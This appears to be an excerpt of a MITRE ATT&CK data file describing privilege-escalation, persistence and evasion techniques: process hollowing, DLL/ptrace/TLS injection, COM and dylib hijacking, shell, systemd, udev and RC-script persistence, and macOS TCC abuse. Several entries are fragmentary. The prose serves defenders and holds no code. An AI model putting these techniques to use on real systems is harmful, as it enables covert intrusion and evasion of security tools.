        A pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.(Citation: Lazarus APT January 2022)

        The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload.(Citation: Lazarus APT January 2022) Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.

      name: Hijack Execution Flow
      description: |-
        Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.

        There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.

        Adversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host.

        For example, by using the `docker run` or `podman run` command with the `restart=always` directive, a container can be configured to persistently restart on the host.(Citation: AquaSec TeamTNT 2023) A user with access to the (rootful) docker command may also be able to escalate their privileges on the host.(Citation: GTFOBins Docker)

        In Kubernetes environments, DaemonSets allow an adversary to persistently [Deploy Container](https://attack.mitre.org/techniques/T1610)s on all nodes, including ones added later to the cluster.(Citation: Aquasec Kubernetes Attack 2023)(Citation: Kubernetes DaemonSet) Pods can also be deployed to specific nodes using the `nodeSelector` or `nodeName` fields in the pod spec.(Citation: Kubernetes Assigning Pods to Nodes)(Citation: AppSecco Kubernetes Namespace Breakout 2020)

        Note that containers can also be configured to run as [Systemd Service](https://attack.mitre.org/techniques/T1543/002)s.(Citation: Podman Systemd)(Citation: Docker Systemd)

      description: |-
        Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

        In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)

        The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)

      description: "Adversaries may inject malicious code into suspended and hollowed
        processes in order to evade process-based defenses. Process hollowing is a
        method of executing arbitrary code in the address space of a separate live
        process.  \n\nProcess hollowing is commonly performed by creating a process
        in a suspended state then unmapping/hollowing its memory, which can then be
        replaced with malicious code. A victim process can be created with native
        Windows API calls such as <code>CreateProcess</code>, which includes a flag
        to suspend the processes primary thread. At this point the process can be
        unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>
        \ before being written to, realigned to the injected code, and resumed via
        <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>,
        then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation:
        Elastic Process Injection July 2017)\n\nThis is very similar to [Thread Local
        Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new
        process rather than targeting an existing process. This behavior will likely
        not result in elevated privileges since the injected process was spawned from
        (and thus inherits the security context) of the injecting process. However,
        execution via process hollowing may also evade detection from security products
        since the execution is masked under a legitimate process. "

      name: Exploitation for Privilege Escalation
      description: |-
        Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.

        When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.

        Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).

      description: "Adversaries may establish persistence through executing malicious
        commands triggered by a user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s
        execute several configuration scripts at different points throughout the session
        based on events. For example, when a user opens a command-line interface or
        remotely logs in (such as via SSH) a login shell is initiated. The login shell
        executes scripts from the system (<code>/etc</code>) and the user’s home directory
        (<code>~/</code>) to configure the environment. All login shells on a system
        use /etc/profile when initiated. These configuration scripts run at the permission
        level of their directory and are often used to set environment variables,
        create aliases, and customize the user’s environment. When the shell exits
        or terminates, additional shell scripts are executed to ensure the shell exits
        appropriately. \n\nAdversaries may attempt to establish persistence by inserting
        commands into scripts automatically executed by shells. Using bash as an example,
        the default shell for most GNU/Linux systems, adversaries may add commands
        that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code>
        files.(Citation: intezer-kaiji-malware)(Citation: bencane blog bashrc) These
        files typically require root permissions to modify and are executed each time
        any shell on a system launches. For user level permissions, adversaries can
        insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>,
        or <code>~/.profile</code> which are sourced when a user opens a command-line
        interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation:
        Linux manual bash invocation) Since the system only executes the first existing
        file in the listed order, adversaries have used <code>~/.bash_profile</code>
        to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code>
        file which is additionally executed if the connection is established remotely
        or an additional interactive shell is opened, such as a new tab in the command-line
        interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation:
        Magento) Some malware targets the termination of a program to trigger execution,
        adversaries can use the <code>~/.bash_logout</code> file to execute malicious
        commands at the end of a session. \n\nFor macOS, the functionality of this
        technique is similar but may leverage zsh, the default shell for macOS 10.15+.
        When the Terminal.app is opened, the application launches a zsh login shell
        and a zsh interactive shell. The login shell configures the system environment
        using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>,
        and <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation:
        code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login
        shell then configures the user environment with <code>~/.zprofile</code> and
        <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code>
        to configure the user environment. Upon exiting, <code>/etc/zlogout</code>
        and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes
        <code>/etc/bashrc</code> on startup."

      description: |-
        Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).

        With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators.

      name: 'Event Triggered Execution: Component Object Model Hijacking'
      description: "Adversaries may establish persistence by executing malicious content
        triggered by hijacked references to Component Object Model (COM) objects.
        COM is a system within Windows to enable interaction between software components
        through the operating system.(Citation: Microsoft Component Object Model)
        \ References to various COM objects are stored in the Registry. \n\nAdversaries
        may use the COM system to insert malicious code that can be executed in place
        of legitimate software through hijacking the COM references and relationships
        as a means for persistence. Hijacking a COM object requires a change in the
        Registry to replace a reference to a legitimate system component which may
        cause that component to not work when executed. When that system component
        is executed through normal system operation the adversary's code will be executed
        instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects
        that are used frequently enough to maintain a consistent level of persistence,
        but are unlikely to break noticeable functionality within the system as to
        avoid system instability that could lead to detection. \n\nOne variation of
        COM hijacking involves abusing Type Libraries (TypeLibs), which provide metadata
        about COM objects, such as their interfaces and methods. Adversaries may modify
        Registry keys associated with TypeLibs to redirect legitimate COM object functionality
        to malicious scripts or payloads. Unlike traditional COM hijacking, which
        commonly uses local DLLs, this variation may leverage the \"script:\" moniker
        to execute remote scripts hosted on external servers.(Citation: RELIAQUEST)
        This approach enables stealthy execution of code while maintaining persistence,
        as the remote payload would be automatically downloaded whenever the hijacked
        COM object is accessed."

      name: 'Hijack Execution Flow: Path Interception by Unquoted Path'
      description: |-
        Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.

        Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\unsafe path with space\program.exe</code> vs. <code>"C:\safe path with space\program.exe"</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\program files\myapp.exe</code>, an adversary may create a program at <code>C:\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)

        This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.

        is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)),
        and thus the appropriate folder, <code>/Library/StartupItems</code> isn’t
        guaranteed to exist on the system by default, but does appear to exist by
        default on macOS Sierra. A startup item is a directory whose executable and
        configuration property list (plist), <code>StartupParameters.plist</code>,
        reside in the top-level directory. \n\nAn adversary can create the appropriate
        folders/files in the StartupItems directory to register their own persistence
        mechanism.(Citation: Methods of Mac Malware Persistence) Additionally, since
        StartupItems run during the bootup phase of macOS, they will run as the elevated

      description: "Adversaries may achieve persistence by leveraging Python’s startup
        mechanisms, including path configuration (`.pth`) files and the `sitecustomize.py`
        or `usercustomize.py` modules. These files are automatically processed during
        the initialization of the Python interpreter, allowing for the execution of
        arbitrary code whenever Python is invoked.(Citation: Volexity GlobalProtect
        CVE 2024)\n\nPath configuration files are designed to extend Python’s module
        search paths through the use of import statements. If a `.pth` file is placed
        in Python's `site-packages` or `dist-packages` directories, any lines beginning
        with `import` will be executed automatically on Python invocation.(Citation:
        DFIR Python Persistence 2025) Similarly, if `sitecustomize.py` or `usercustomize.py`
        is present in the Python path, these files will be imported during interpreter
        startup, and any code they contain will be executed.(Citation: Python Site
        Configuration Hook)\n\nAdversaries may abuse these mechanisms to establish
        persistence on systems where Python is widely used (e.g., for automation or
        scripting in production environments).  "

        Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\Windows\System32\</code>, and <code>C:\Windows\sysWOW64\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.

        The following screensaver settings are stored in the Registry (<code>HKCU\Control Panel\Desktop\</code>) and could be manipulated to achieve persistence:

        * <code>SCRNSAVE.exe</code> - set to malicious PE path
        * <code>ScreenSaveActive</code> - set to '1' to enable the screensaver
        * <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock
        * <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed

        Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.(Citation: ESET Gazer Aug 2017)

      description: "Adversaries may inject malicious code into processes via the /proc
        filesystem in order to evade process-based defenses as well as possibly elevate
        privileges. Proc memory injection is a method of executing arbitrary code
        in the address space of a separate live process. \n\nProc memory injection
        involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>)
        then crafting a return-oriented programming (ROP) payload with available gadgets/instructions.
        Each running process has its own directory, which includes memory mappings.
        Proc memory injection is commonly performed by overwriting the target processes’
        stack using memory mappings provided by the /proc filesystem. This information
        can be used to enumerate offsets (including the stack) and gadgets (or instructions
        within the program that can be used to build a malicious payload) otherwise
        hidden by process memory protections such as address space layout randomization
        (ASLR). Once enumerated, the target processes’ memory map within <code>/proc/[pid]/maps</code>
        can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux
        Injection)(Citation: DD Man) \n\nOther techniques such as [Dynamic Linker
        Hijacking](https://attack.mitre.org/techniques/T1574/006) may be used to populate
        a target process with more available gadgets. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012),
        proc memory injection may target child processes (such as a backgrounded copy
        of sleep).(Citation: GDS Linux Injection) \n\nRunning code in the context
        of another process may allow access to the process's memory, system/network
        resources, and possibly elevated privileges. Execution via proc memory injection
        may also evade detection from security products since the execution is masked
        under a legitimate process. "

      description: |-
        Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.(Citation: Installer Package Scripting Rich Trouton)

        Using legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS `postinstall` scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)) with the elevated permissions.(Citation: Application Bundle Manipulation Brandon Dalton)(Citation: wardle evilquest parti)(Citation: Windows AppleJeus GReAT)(Citation: Debian Manual Maintainer Scripts)

        Depending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include `preinst`, `postinst`, `prerm`, `postrm` scripts and run as root when executed.

        For Windows, the Microsoft Installer services uses `.msi` files to manage the installing, updating, and uninstalling of applications. These installation routines may also include instructions to perform additional actions that may be abused by adversaries.(Citation: Microsoft Installation Procedures)

        Adversaries may establish persistence by modifying RC scripts, which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.

        Adversaries may establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence.

        Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as ESXi hypervisors, IoT, or embedded systems.(Citation: intezer-kaiji-malware) As ESXi servers store most system files in memory and therefore discard changes on shutdown, leveraging `/etc/rc.local.d/local.sh` is one of the few mechanisms for enabling persistence across reboots.(Citation: Juniper Networks ESXi Backdoor 2022)

        Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of Launchd.(Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc)

      name: Access Token Manipulation
      description: |-
        Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.

        An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)

        Any standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.

      description: "Adversaries may create or modify systemd services to repeatedly
        execute malicious payloads as part of persistence. Systemd is a system and
        service manager commonly used for managing background daemon processes (also
        known as services) and other system resources.(Citation: Linux man-pages:
        systemd January 2014) Systemd is the default initialization (init) system
        on many Linux distributions replacing legacy init systems, including SysVinit
        and Upstart, while remaining backwards compatible.  \n\nSystemd utilizes unit
        configuration files with the `.service` file extension to encode information
        about a service's process. By default, system level unit files are stored
        in the `/systemd/system` directory of the root owned directories (`/`). User
        level unit files are stored in the `/systemd/user` directories of the user
        owned directories (`$HOME`).(Citation: lambert systemd 2022) \n\nInside the
        `.service` unit files, the following directives are used to execute commands:(Citation:
        freedesktop systemd.service)  \n\n* `ExecStart`, `ExecStartPre`, and `ExecStartPost`
        directives execute when a service is started manually by `systemctl` or on
        system start if the service is set to automatically start.\n* `ExecReload`
        directive executes when a service restarts. \n* `ExecStop`, `ExecStopPre`,
        and `ExecStopPost` directives execute when a service is stopped.  \n\nAdversaries
        have created new service files, altered the commands a `.service` file’s directive
        executes, and modified the user directive a `.service` file executes as, which
        could result in privilege escalation. Adversaries may also place symbolic
        links in these directories, enabling systemd to find these payloads regardless
        of where they reside on the filesystem.(Citation: Anomali Rocke March 2019)(Citation:
        airwalk backdoor unix systems)(Citation: Rapid7 Service Persistence 22JUNE2016)
        \n\nThe `.service` file’s User directive can be used to run service as a specific
        user, which could result in privilege escalation based on specific user/group
        permissions. \n\nSystemd services can be created via systemd generators, which
        support the dynamic generation of unit files. Systemd generators are small
        executables that run during boot or configuration reloads to dynamically create
        or modify systemd unit files by converting non-native configurations into
        services, symlinks, or drop-ins (i.e., [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037)).(Citation:

        Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user’s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (`.desktop`) to configure the user’s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.(Citation: Free Desktop Application Autostart Feb 2006)(Citation: Free Desktop Entry Keys)

        Adversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the `Exec` directive in the `.desktop` configuration file. When the user’s desktop environment is loaded at user login, the `.desktop` files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the `/etc/xdg/autostart` directory while the user entries are located in the `~/.config/autostart` directory.

        Adversaries may combine this technique with [Masquerading](https://attack.mitre.org/techniques/T1036) to blend malicious Autostart entries with legitimate programs.(Citation: Red Canary Netwire Linux 2022)

      description: "Adversaries may inject malicious code into processes via thread
        local storage (TLS) callbacks in order to evade process-based defenses as
        well as possibly elevate privileges. TLS callback injection is a method of
        executing arbitrary code in the address space of a separate live process.
        \n\nTLS callback injection involves manipulating pointers inside a portable
        executable (PE) to redirect a process to malicious code before reaching the
        code's legitimate entry point. TLS callbacks are normally used by the OS to
        setup and/or cleanup data used by threads. Manipulating TLS callbacks may
        be performed by allocating and writing to specific offsets within a process’
        memory space using other [Process Injection](https://attack.mitre.org/techniques/T1055)
        techniques such as [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).(Citation:
        FireEye TLS Nov 2017)\n\nRunning code in the context of another process may
        allow access to the process's memory, system/network resources, and possibly
        elevated privileges. Execution via TLS callback injection may also evade detection
        from security products since the execution is masked under a legitimate process. "

        Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to "Reopen windows when logging back in".(Citation: Re-Open windows on Mac) When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code> directory.(Citation: Methods of Mac Malware Persistence)(Citation: Wardle Persistence Chapter) Applications listed in this file are automatically reopened upon the user’s next logon.

        Adversaries can establish [Persistence](https://attack.mitre.org/tactics/TA0003) by adding a malicious application path to the <code>com.apple.loginwindow.[UUID].plist</code> file to execute payloads when a user logs in.

        mailbox folder permissions through individual folder permissions or roles.
        In Office 365 environments, adversaries may assign the Default or Anonymous
        user permissions or roles to the Top of Information Store (root), Inbox, or
        other mailbox folders. By assigning one or both user permissions to a folder,

      description: |+
        Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to grant malicious executables elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).

        When an application requests to access data or a service protected by TCC, the TCC daemon (`tccd`) checks the TCC database, located at `/Library/Application Support/com.apple.TCC/TCC.db` (and `~/` equivalent), and an overwrites file (if connected to an MDM) for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again.(Citation: welivesecurity TCC)

        Adversaries may access restricted data or services protected by TCC through abusing applications previously granted permissions through [Process Injection](https://attack.mitre.org/techniques/T1055) or executing a malicious binary using another application. For example, adversaries can use Finder, a macOS native app with FDA permissions, to execute a malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002). When executing under the Finder App, the malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002) inherits access to all files on the system without requiring a user prompt. When System Integrity Protection (SIP) is disabled, TCC protections are also disabled. For a system without SIP enabled, adversaries can manipulate the TCC database to add permissions to their malicious executable through loading an adversary controlled TCC database using environment variables and [Launchctl](https://attack.mitre.org/techniques/T1569/001).(Citation: TCC macOS bypass)(Citation: TCC Database)

      description: "Adversaries may inject malicious code into processes via ptrace
        (process trace) system calls in order to evade process-based defenses as well
        as possibly elevate privileges. Ptrace system call injection is a method of
        executing arbitrary code in the address space of a separate live process.
        \n\nPtrace system call injection involves attaching to and modifying a running
        process. The ptrace system call enables a debugging process to observe and
        control another process (and each individual thread), including changing memory
        and register values.(Citation: PTRACE man) Ptrace system call injection is
        commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>)
        then invoking that memory with <code>PTRACE_SETREGS</code> to set the register
        containing the next instruction to execute. Ptrace system call injection can
        also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>,
        which copy data to a specific address in the target processes’ memory (ex:
        the current address of the next instruction). (Citation: PTRACE man)(Citation:
        Medium Ptrace JUL 2018) \n\nPtrace system call injection may not be possible
        targeting processes that are non-child processes and/or have higher-privileges.(Citation:
        BH Linux Inject) \n\nRunning code in the context of another process may allow
        access to the process's memory, system/network resources, and possibly elevated
        privileges. Execution via ptrace system call injection may also evade detection
        from security products since the execution is masked under a legitimate process. "

        Code executed via ListPlanting may also evade detection from security products
        since the execution is masked under a legitimate process.\n\nList-view controls
        are user interface windows used to display collections of items.(Citation:
        Microsoft List View Controls) Information about an application's list-view
        settings are stored within the process' memory in a <code>SysListView32</code>
        control.\n\nListPlanting (a form of message-passing \"shatter attack\") may
        be performed by copying code into the virtual address space of a process that
        uses a list-view control then using that code as a custom callback for sorting
        the listed items.(Citation: Modexp Windows Process Injection) Adversaries
        must first copy code into the target process’ memory space, which can be performed
        various ways including by directly obtaining a handle to the <code>SysListView32</code>
        child of the victim process window (via Windows API calls such as <code>FindWindow</code>
        and/or <code>EnumWindows</code>) or other [Process Injection](https://attack.mitre.org/techniques/T1055)
        methods.\n\nSome variations of ListPlanting may allocate memory in the target
        process but then use window messages to copy the payload, to avoid the use
        of the highly monitored <code>WriteProcessMemory</code> function. For example,
        an adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code>
        API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code>
        messages, effectively copying a payload 2 bytes at a time to the allocated
        memory.(Citation: ESET InvisiMole June 2020) \n\nFinally, the payload is triggered
        by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code>
        child of the process window, with the payload within the newly allocated buffer
        passed and executed as the <code>ListView_SortItems</code> callback."

      description: "Adversaries may inject dynamic-link libraries (DLLs) into processes
        in order to evade process-based defenses as well as possibly elevate privileges.
        DLL injection is a method of executing arbitrary code in the address space
        of a separate live process.  \n\nDLL injection is commonly performed by writing
        the path to a DLL in the virtual address space of the target process before
        loading the DLL by invoking a new thread. The write can be performed with
        native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>,
        then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code>
        API responsible for loading the DLL). (Citation: Elastic Process Injection
        July 2017) \n\nVariations of this method such as reflective DLL injection
        (writing a self-mapping DLL into a process) and memory module (map DLL when
        writing into process) overcome the address relocation issue as well as the
        additional APIs to invoke execution (since these methods load and execute
        the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation:
        Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July
        2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading
        or DLL Hollowing, may be leveraged to conceal injected code within a process.
        This method involves loading a legitimate DLL into a remote process then manually
        overwriting the module's <code>AddressOfEntryPoint</code> before starting
        a new thread in the target process.(Citation: Module Stomping for Shellcode
        Injection) This variation allows attackers to hide malicious injected code
        by potentially backing its execution with a legitimate DLL file on disk.(Citation:
        Hiding Malicious Code with Module Stomping) \n\nRunning code in the context
        of another process may allow access to the process's memory, system/network
        resources, and possibly elevated privileges. Execution via DLL injection may
        also evade detection from security products since the execution is masked
        under a legitimate process. "

      name: Udev Rules
      description: |-
        Adversaries may maintain persistence through executing malicious content triggered using udev rules. Udev is the Linux kernel device manager that dynamically manages device nodes, handles access to pseudo-device files in the `/dev` directory, and responds to hardware events, such as when external devices like hard drives or keyboards are plugged in or removed. Udev uses rule files with `match keys` to specify the conditions a hardware event must meet and `action keys` to define the actions that should follow. Root permissions are required to create, modify, or delete rule files located in `/etc/udev/rules.d/`, `/run/udev/rules.d/`, `/usr/lib/udev/rules.d/`, `/usr/local/lib/udev/rules.d/`, and `/lib/udev/rules.d/`. Rule priority is determined by both directory and by the digit prefix in the rule filename.(Citation: Ignacio Udev research 2024)(Citation: Elastic Linux Persistence 2024)

        Adversaries may abuse the udev subsystem by adding or modifying rules in udev rule files to execute malicious content. For example, an adversary may configure a rule to execute their binary each time the pseudo-device file, such as `/dev/random`, is accessed by an application. Although udev is limited to running short tasks and is restricted by systemd-udevd's sandbox (blocking network and filesystem access), attackers may use scripting commands under the action key `RUN+=` to detach and run the malicious content’s process in the background to bypass these controls.(Citation: Reichert aon sedexp 2024)

        Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\SOFTWARE\Microsoft\Netsh</code>.

        Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.(Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)

        Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.

        Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)

      name: 'Hijack Execution Flow: COR_PROFILER'
      description: |-
